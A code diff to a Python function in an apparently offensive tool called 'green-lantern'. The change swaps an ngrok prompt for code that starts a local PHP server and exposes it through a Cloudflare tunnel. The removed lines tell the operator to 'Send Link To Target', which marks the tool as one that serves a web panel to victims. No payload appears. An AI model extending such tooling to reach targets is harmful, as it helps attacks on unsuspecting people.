@@ -29,20 +29,21 @@ def md5_hash():
 
 
 def run_php_server(port):
-    with open(f"green-lantern/log/php-{md5_hash().hexdigest()}.log","w") as php_log:
-        proc_info = subprocess.Popen(("php","-S",f"localhost:{port}","-t","green-lantern"),stderr=php_log,stdout=php_log).pid
+    print(f"Starting PHP server on port {port}...")
+    subprocess.Popen(["php", "-S", f"localhost:{port}"])
 
+    # Wait a few seconds to ensure PHP server starts
+    time.sleep(2)
 
-    with open("green-lantern/Settings.json", "r") as jsonFile:
-        data = json.load(jsonFile)
-        data["pid"].append(proc_info)
+    # Start Cloudflare Tunnel
+    print("Starting Cloudflare Tunnel...")
+    tunnel_process = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-
-    with open("green-lantern/Settings.json", "w") as jsonFile:
-        json.dump(data, jsonFile)
-
-
-    print(Fore.RED+" [+] "+Fore.GREEN+"Web Panel Link : "+Fore.WHITE+f"http://localhost:{port}")
-    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)
-
+    # Print the Cloudflare tunnel URL
+    for line in tunnel_process.stdout:
+        decoded_line = line.decode().strip()
+        print(decoded_line)
+        if "https://" in decoded_line:
+            print(f"Your public URL: {decoded_line}")
+            break
 
